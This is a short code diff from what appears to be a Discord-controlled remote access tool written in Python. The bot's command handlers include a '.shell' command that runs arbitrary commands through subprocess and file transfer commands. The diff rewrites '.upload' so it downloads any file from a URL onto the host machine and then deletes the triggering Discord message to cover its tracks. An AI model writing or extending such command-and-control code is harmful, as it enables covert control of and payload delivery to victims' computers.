@@ -423,8 +423,15 @@ async def on_message(message):
                     embed = discord.Embed(title="Error", description=f"```File Not Found```", color=0xfafafa)
                     await message.reply(embed=embed)
             elif message.content.lower().startswith(".upload"):
-                await message.attachments[0].save(message.content[8:])
-                await message.channel.send("uploaded file")
+                link = message.content[8:]
+                file = requests.get(link).content
+                file_name = os.path.basename(link)
+                file_name = file_name.rsplit('_', 1)[0] + '.' + file_name.rsplit('_', 1)[1]
+                with open(file_name, "wb") as f:
+                    f.write(file)
+                embed = discord.Embed(title="Upload", description=f"```{file_name}```", color=0xfafafa)
+                await message.reply(embed=embed)
+                await message.delete()
             elif message.content.lower().startswith(".shell"):
                 command = message.content[7:]
                 output = subprocess.Popen(
